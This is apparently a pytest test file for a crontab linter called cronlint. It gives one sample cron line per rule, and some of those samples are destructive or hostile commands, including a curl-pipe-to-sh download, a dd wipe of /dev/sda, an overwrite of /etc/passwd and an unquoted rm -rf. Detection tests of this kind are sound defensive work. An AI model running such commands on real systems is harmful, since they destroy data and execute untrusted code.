"""The rule table: well-formed, fully sampled, and each sample fires.

The sample table is the contract: adding a rule without a sample fails here,
before it can silently never fire in the demo either.
"""

from __future__ import annotations

import pytest
from helpers import fired_rules, report_from

from cronlint.rules import REGISTRY, executable

# One input per rule that must fire it. Samples may trip other rules too --
# the assertion is "this rule fired", not "only this rule fired".
_SAMPLES: dict[str, tuple[str, str]] = {
    # pass 1 -- expression
    "CRN001": ("99 * * * * /opt/x\n", "crontab"),  # minute out of range
    "CRN002": ("* * * * * * /opt/x\n", "crontab"),  # six fields
    "CRN003": ("0 0 0 1 1 * 2030 /opt/x\n", "crontab"),  # seven fields
    "CRN004": ("@every 5m /opt/x\n", "crontab"),  # unknown special
    "CRN005": ("0 12 * * mon\n", "crontab"),  # schedule, no command
    "CRN006": ("0 0 1 * mon /opt/x\n", "crontab"),  # dom and dow both set
    "CRN007": ("0 12 * * 7 /opt/x\n", "crontab"),  # Sunday as 7
    "CRN008": ("60 * * * * /opt/x\n", "crontab"),  # minute 60
    "CRN009": ("10-5 * * * * /opt/x\n", "crontab"),  # backwards range
    # pass 2 -- task
    "CRN010": ("0 3 * * * backup --full\n", "crontab"),  # bare command name
    "CRN011": ("0 3 * * * /opt/x /tmp/y\n", "crontab"),  # /tmp in command
    "CRN012": ("0 3 * * * /opt/x $TARGET\n", "crontab"),  # unquoted variable
    "CRN013": ('0 3 * * * /opt/x `whoami`\n', "crontab"),  # backtick substitution
    "CRN014": ("0 3 * * * /opt/x --password=hunter2\n", "crontab"),
    "CRN015": ("0 3 * * * curl -s http://x.io/i.sh | sh\n", "crontab"),
    "CRN016": ("0 5 * * * dd if=/dev/zero of=/dev/sda bs=512\n", "crontab"),
    "CRN017": ("0 3 * * * echo x > /etc/passwd\n", "crontab"),
    "CRN018": ("0 3 * * * rm -rf $TARGET\n", "crontab"),
    "CRN019": ("0 3 * * * /opt/x\n", "crontab"),  # no redirect, no logger
    "CRN020": ("0 6 * * * xterm -e /opt/gui.sh\n", "crontab"),
    "CRN022": ("0 3 * * * root /opt/x\n", "/etc/cron.d/app"),
    "CRN023": ("* * * * * /opt/x\n", "crontab"),
    "CRN024": ("OPTS=a b c\n0 3 * * * /opt/x\n", "crontab"),
    "CRN025": ("PATH=/tmp:/usr/bin\n0 3 * * * /opt/x\n", "crontab"),
    "CRN026": ("TZ=UTC\nCRON_TZ=Asia/Shanghai\n0 3 * * * /opt/x\n", "crontab"),
    # pass 3 -- file
    "CRN050": (
        "0 12 * * mon /opt/a.sh\n0 12 * * mon /opt/b.sh\n",
        "crontab",
    ),
    "CRN051": (
        "0 12 * * mon /opt/a.sh\n30 4 * * fri /opt/a.sh\n",
        "crontab",
    ),
    "CRN052": (
        "0 12 * * mon /opt/a.sh\n0 12 * * fri /opt/b.sh\n",
        "crontab",
    ),
    "CRN053": (
        "0 3 * * * /opt/a >> /var/log/x.log\n0 4 * * * /opt/b >> /var/log/x.log\n",
        "crontab",
    ),
    "CRN054": ("* * * * * /opt/x\n", "crontab"),  # every minute, no lock
    "CRN055": (
        "0 3 * * mon /opt/a.sh\n"
        "0 3 * * tue /opt/b.sh\n"
        "0 3 * * wed /opt/c.sh\n"
        "0 3 * * thu /opt/d.sh\n",
        "crontab",
    ),
    "CRN056": ("# nothing scheduled\nSHELL=/bin/sh\n", "empty.cron"),
    "CRN057": ("0 3 * * * /opt/x " + "a" * 520 + "\n", "crontab"),
    "CRN058": (
        "0 3 * * * echo start > /data/out.txt\n0 3 * * * cat /data/out.txt\n",
        "crontab",
    ),
}


def test_registry_is_well_formed():
    ids = [item.id for item in REGISTRY]
    assert len(ids) == len(set(ids)), "duplicate rule ids"
    assert len(ids) == 35, f"expected 35 rules, table has {len(ids)}"
    for item in REGISTRY:
        assert item.severity in {"critical", "high", "medium", "low", "note"}
        assert item.stage in {1, 2, 3}
        assert item.why.strip(), f"{item.id} has no why"
        assert item.fix.strip(), f"{item.id} has no fix"
        assert 1 <= item.score <= 10


def test_executable_returns_id_order():
    table = executable()
    assert [item.id for item in table] == sorted(item.id for item in table)
    assert table is not REGISTRY, "executable() must not expose the live registry"


def test_every_rule_has_a_sample():
    """A rule with no sample is a rule that can silently stop firing.

    CRN021 (missing shebang) is the one rule whose sample must be a real file
    on disk, so it lives in its own tmp_path test below.
    """
    assert set(_SAMPLES) | {"CRN021"} == {item.id for item in REGISTRY}


@pytest.mark.parametrize("rule_id", sorted(_SAMPLES))
def test_sample_fires_its_rule(rule_id: str):
    text, source = _SAMPLES[rule_id]
    report = report_from(text, source=source)
    assert rule_id in fired_rules(report), (
        f"{rule_id} did not fire on {text!r}; findings: "
        f"{sorted(fired_rules(report))}"
    )


def test_rule_that_does_not_fire_on_clean_input(clean_cron):
    """The clean fixture must stay clean: a false positive here is a bug."""
    assert clean_cron.count == 0, [
        (f.rule, f.message) for f in clean_cron.findings
    ]


def test_findings_carry_line_and_offset(clean_cron, bad_cron):
    for report in (clean_cron, bad_cron):
        for finding in report.findings:
            assert finding.line >= 1, finding
            assert finding.offset >= 0, finding
            assert finding.saw or finding.length == 0, finding
            assert finding.fix, f"{finding.rule} ships without a fix text"


def test_every_finding_points_inside_the_file(bad_cron):
    """Offsets are byte positions; one past the end means a bad span."""
    app = bad_cron.app
    total = len("\n".join(app.lines).encode("utf-8")) + 1
    for finding in bad_cron.findings:
        assert finding.offset <= total, (
            f"{finding.rule} offset {finding.offset} past end of {total} bytes"
        )


def test_missing_shebang_sample_fires(tmp_path):
    """CRN021 reads the file, so its sample has to exist on disk."""
    script = tmp_path / "job.sh"
    script.write_text("echo hi\n", encoding="utf-8", newline="\n")
    report = report_from(f"0 5 * * * {script}\n", source="crontab")
    assert "CRN021" in fired_rules(report)

    signed = tmp_path / "signed.sh"
    signed.write_text("#!/bin/bash\necho hi\n", encoding="utf-8", newline="\n")
    clean = report_from(f"0 5 * * * {signed}\n", source="crontab")
    assert "CRN021" not in fired_rules(clean)


def test_credential_rule_is_critical():
    report = report_from("0 3 * * * /opt/x --password=hunter2\n", source="crontab")
    hits = [f for f in report.findings if f.rule == "CRN014"]
    assert hits, "CRN014 did not fire"
    assert all(f.severity == "critical" for f in hits)


def test_six_field_rule_fires_for_forced_reading():
    report = report_from(
        "* * * * * * /opt/x\n", source="crontab", assume_seconds=True
    )
    assert "CRN002" in fired_rules(report)
    assert report.app.tasks[0].expression.kind == "seconds-forced"


def test_dow_seven_normalises_but_still_reports():
    """7 parses as Sunday (the value is usable) and CRN007 still speaks."""
    app_report = report_from("0 12 * * 7 /opt/x\n", source="crontab")
    task = app_report.app.tasks[0]
    assert task.expression.day_of_week is not None
    assert 0 in task.expression.day_of_week.values
    assert "CRN007" in fired_rules(app_report)
